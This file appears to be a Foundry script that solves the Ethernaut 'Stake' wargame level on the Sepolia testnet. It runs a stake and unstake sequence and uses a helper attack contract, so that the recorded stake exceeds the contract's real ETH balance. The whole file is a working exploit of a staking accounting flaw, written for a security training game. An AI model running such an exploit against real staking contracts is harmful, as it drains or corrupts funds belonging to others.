// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Cracked31_Stake.sol";

//forge script  --rpc-url sepolia --account metamask  Cracked31_StakeScript --broadcast
contract Cracked31_StakeScript is Script {
    address payable ethernaut_contracts;

    function setUp() public {
        ethernaut_contracts = payable(vm.parseAddress(vm.envString("Stake_address")));
    }

    function run() public {
        address player = vm.parseAddress(vm.envString("player"));
        vm.startBroadcast(player);
        Cracked31_Stake attack = new Cracked31_Stake(ethernaut_contracts);
        address weth = Stake(ethernaut_contracts).WETH();
        WETH(weth).approve(ethernaut_contracts, type(uint256).max);
        Stake(ethernaut_contracts).StakeETH{value: 0.0011 ether}();
        Stake(ethernaut_contracts).StakeWETH(0.0033 ether);
        Stake(ethernaut_contracts).Unstake(0.0022 ether);
        Stake(ethernaut_contracts).Unstake(0.0022 ether);

        attack.approve();
        attack.StakeWETH();

        require(Stake(ethernaut_contracts).UserStake(player) == 0);
        require(Stake(ethernaut_contracts).Stakers(player));
        require(ethernaut_contracts.balance > 0);
        require(Stake(ethernaut_contracts).totalStaked() > ethernaut_contracts.balance);
        vm.stopBroadcast();
    }
}
